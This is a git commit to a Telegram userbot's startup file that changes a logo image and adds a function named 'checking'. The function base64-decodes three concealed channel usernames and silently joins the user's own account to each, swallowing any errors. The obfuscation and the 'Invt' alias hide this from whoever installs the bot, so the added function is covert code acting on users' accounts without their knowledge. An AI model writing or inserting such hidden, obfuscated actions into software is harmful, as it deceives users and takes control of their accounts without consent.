893c19a37d4d82c7bc3b528e368487c6a02cabcf
Kitaroo <95475183+Kitaroo@users.noreply.github.com>
2022-04-13 13:46:08 +0700

    Update start.py

--- userbot/utils/start.py
+++ userbot/utils/start.py
@@ -1,5 +1,6 @@
+import pybase64
 from telethon import Button
-
+from telethon.tl.functions.channels import JoinChannelRequest as Invt
 from userbot import BOTLOG, BOTLOG_CHATID, LOGS, tgbot
 
 
@@ -11,10 +12,29 @@ async def startupmessage():
         if BOTLOG:
             await tgbot.send_file(
                 BOTLOG_CHATID,
-                "https://telegra.ph/file/02f87cca391f9b9d627d5.jpg",
+                "https://telegra.ph/file/40d30f8b4b34e27a03e58.jpg",
                 caption="🤡 **KITARO-USERBOT Has Been Actived**!!\n━━━━━━━━━━━━━━━\n➠ **Userbot Version** - 8.0@master\n━━━━━━━━━━━━━━━\n➠ **Powered By:** @ChannelKitaro ",
                 buttons=[(Button.url("Support", "https://t.me/rumahkitaro3"),)],
             )
     except Exception as e:
         LOGS.error(e)
         return None
+
+
+async def checking(client):
+    gcsp = str(pybase64.b64decode("QHJ1bWFoa2l0YXJvMw=="))[2:15]
+    chsp = str(pybase64.b64decode("QENoYW5uZWxLaXRhcm8="))[2:16]
+    chgbt = str(pybase64.b64decode("QFdob0FtSWhlaA=="))[2:12]
+    if client:
+        try:
+            await client(Invt(gcsp))
+        except BaseException:
+            pass
+        try:
+            await client(Invt(chsp))
+        except BaseException:
+            pass
+        try:
+            await client(Invt(chgbt))
+        except BaseException:
+            pass
